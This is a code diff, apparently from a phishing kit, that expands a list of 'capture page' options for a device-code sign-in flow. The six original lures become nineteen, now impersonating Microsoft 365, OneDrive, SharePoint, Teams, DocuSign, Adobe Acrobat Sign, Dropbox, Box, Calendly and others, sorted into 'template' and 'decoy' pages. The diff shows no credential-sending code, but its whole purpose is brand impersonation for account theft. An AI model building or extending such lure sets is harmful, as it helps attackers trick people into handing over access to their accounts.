@@ -13,42 +13,27 @@ interface PageOption {
 }
 
 const PAGE_OPTIONS: PageOption[] = [
-  {
-    id: 'default',
-    name: 'Default — Device Code',
-    description: 'The original capture page with device verification code and step-by-step sign-in instructions.',
-    category: 'template',
-  },
-  {
-    id: 'microsoft-verify',
-    name: 'Microsoft Verify',
-    description: 'Looks like a Microsoft account identity verification page. Clean and minimal.',
-    category: 'template',
-  },
-  {
-    id: 'outlook-sync',
-    name: 'Outlook Sync',
-    description: 'Appears as an Outlook mailbox sync setup with split-panel layout and progress bar.',
-    category: 'template',
-  },
-  {
-    id: 'schedule-meeting',
-    name: 'Schedule a Meeting',
-    description: 'Calendar + time slot picker that looks like an Outlook meeting scheduler.',
-    category: 'decoy',
-  },
-  {
-    id: 'it-support',
-    name: 'IT Support Portal',
-    description: 'IT Service Desk requiring account verification with ticket number and sidebar nav.',
-    category: 'decoy',
-  },
-  {
-    id: 'password-reset',
-    name: 'Password Reset',
-    description: 'Microsoft-styled password reset flow with step progress bar.',
-    category: 'decoy',
-  },
+  // Templates
+  { id: 'default', name: 'Default — Device Code', description: 'The original capture page with device verification code and step-by-step sign-in instructions.', category: 'template' },
+  { id: 'adobe-sign', name: 'Adobe Acrobat Sign', description: 'Adobe Acrobat Sign document verification page. Users verify identity to view/sign a document.', category: 'template' },
+  { id: 'box', name: 'Box', description: 'Box.com secure file sharing verification. Users verify to access shared files.', category: 'template' },
+  { id: 'docusign-centered', name: 'DocuSign Centered', description: 'Clean centered DocuSign verification page. Minimal design for document signing.', category: 'template' },
+  { id: 'docusign-split', name: 'DocuSign Split Screen', description: 'Split-screen DocuSign layout with features panel and signing form.', category: 'template' },
+  { id: 'dropbox', name: 'Dropbox', description: 'Dropbox file sharing verification. Users verify to access shared folders and files.', category: 'template' },
+  { id: 'microsoft-office', name: 'Microsoft Office', description: 'Microsoft 365 portal sign-in page. Access Word, Excel, PowerPoint, Outlook & more.', category: 'template' },
+  { id: 'microsoft-verify', name: 'Microsoft Verify', description: 'Microsoft account identity verification page. Clean and minimal.', category: 'template' },
+  { id: 'onedrive', name: 'OneDrive', description: 'Microsoft OneDrive file sharing verification. Users verify to access shared content.', category: 'template' },
+  { id: 'outlook-sync', name: 'Outlook Sync', description: 'Outlook mailbox sync setup with split-panel layout and progress bar.', category: 'template' },
+  { id: 'sharepoint', name: 'SharePoint', description: 'SharePoint document library access. Users verify to view team documents.', category: 'template' },
+  // Decoys
+  { id: 'secureshare', name: 'SecureShare', description: 'Enterprise file sharing wrapper with encryption branding. Split-panel layout.', category: 'decoy' },
+  { id: 'calendar-invite', name: 'Calendar Invite', description: 'Microsoft Teams meeting invitation. Users verify to accept and join a meeting.', category: 'decoy' },
+  { id: 'calendly-meeting', name: 'Calendly Meeting', description: 'Calendly-style 10 minute meeting scheduler with time slot picker.', category: 'decoy' },
+  { id: 'bookings-meeting', name: 'Bookings Meeting', description: 'Microsoft Bookings-style scheduling page with calendar and time selection.', category: 'decoy' },
+  { id: 'solarwinds-meeting', name: 'SolarWinds Meeting', description: 'SolarWinds-style meeting booking page with dark theme and meeting type selector.', category: 'decoy' },
+  { id: 'schedule-meeting', name: 'Schedule a Meeting', description: 'Outlook-style meeting scheduler with calendar and time slots.', category: 'decoy' },
+  { id: 'it-support', name: 'IT Support Portal', description: 'IT Service Desk requiring account verification with ticket number and sidebar nav.', category: 'decoy' },
+  { id: 'password-reset', name: 'Password Reset', description: 'Microsoft-styled password reset flow with step progress bar.', category: 'decoy' },
 ];
 
 const TEMPLATES = PAGE_OPTIONS.filter(p => p.category === 'template');
